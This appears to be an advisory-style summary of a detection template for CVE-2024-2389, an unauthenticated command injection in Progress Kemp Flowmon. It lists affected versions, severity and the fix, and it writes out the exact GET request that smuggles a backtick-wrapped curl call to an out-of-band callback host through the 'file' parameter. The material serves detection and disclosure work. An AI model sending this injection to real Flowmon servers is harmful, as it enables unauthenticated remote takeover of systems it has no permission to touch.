## Vulnerability
Progress Kemp Flowmon contains an OS command injection vulnerability (CVE-2024-2389, CWE-78) in versions prior to 11.1.14 and 12.3.5. An unauthenticated remote attacker can inject arbitrary system commands through the Flowmon management interface, achieving complete system compromise. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (score 10.0). Impact includes full unauthenticated RCE; remediation requires updating to 11.1.14 or 12.3.5 or later.

## PoC / Detection
Classification: rce

The template performs a single unauthenticated GET request to `{{BaseURL}}/service.pdfs/confluence?lang=en&file=`curl+{{interactsh-url}}`` to inject an out-of-band `curl` command via the `file` parameter. It verifies exploitation by confirming an HTTP interactsh callback occurred and that response headers contain both `application/json` and `Flowmon`.
